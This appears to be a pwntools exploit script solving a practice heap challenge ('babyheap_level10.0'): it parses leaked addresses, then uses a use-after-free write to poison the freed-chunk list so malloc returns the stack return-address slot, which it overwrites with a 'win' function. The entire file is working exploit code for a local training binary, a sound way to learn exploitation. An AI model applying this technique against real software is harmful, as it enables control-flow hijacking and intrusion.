#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level10.0_patched'
p = process(binary)

s = '''
b malloc
b free
b * main+1628
'''

gdb.attach(p, s)

context.log_level = 'debug'

# parsing the address leak 
p.recvuntil("[LEAK] The local stack address of your allocations is at: ")
stack_leak_str = p.recvline().strip().decode()
stack_leak = int(stack_leak_str.rstrip('.'), 16)  # Remove trailing period if present

p.recvuntil("[LEAK] The address of main is at: ")
main_leak_str = p.recvline().strip().decode()
main_leak = int(main_leak_str.rstrip('.'), 16)  # Remove trailing period if present

# Now you can use these leaks
log.success(f"Stack leak: {hex(stack_leak)}")
log.success(f"Main leak: {hex(main_leak)}")



base = main_leak - 0x01afd
win = base + 0x01a00
rip_addr = stack_leak + 0x110 + 8





p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline("free 0")
p.sendline("free 1")

# 1 0

# uaf
# overwriting the next* pointer 
p.sendline(b"scanf")
p.sendline("1") # 0 becomes rip_addr
p.sendline(p64(rip_addr)) # 8 bytes before destination


p.sendline("malloc 1 100")
p.sendline("malloc 0 100")


p.sendline(b"scanf")
p.sendline("0")
p.sendline(p64(win))


#p.sendline("puts 0")

#p.recvuntil(b"Data: ")
#data = p.recvline().strip()





p.interactive()



